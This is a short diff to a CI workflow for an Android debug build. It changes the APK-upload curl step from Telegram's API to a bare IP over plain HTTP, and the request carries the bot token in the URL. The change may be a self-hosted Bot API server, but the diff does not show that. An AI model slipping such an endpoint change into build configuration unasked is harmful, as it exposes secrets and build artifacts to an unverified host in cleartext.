@@ -29,7 +29,7 @@ workflows:
         
       - name: Build Debug APK (Clean & Optimized)
         script: ./gradlew clean assembleDebug --stacktrace --info --max-workers=2
-             
+
       - name: Send APK to Telegram
         script: |
           echo "Sending APK to Telegram..."
@@ -38,7 +38,7 @@ workflows:
           curl -F chat_id="$TELEGRAM_CHAT_ID" \
                -F document=@"$APK_PATH" \
                -F caption="🚀 newbuild🛠" \
-               https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument
+               http://172.245.152.11:8081/bot$TELEGRAM_BOT_TOKEN/sendDocument
 
     artifacts:
       - app/build/outputs/apk/debug/*.apk
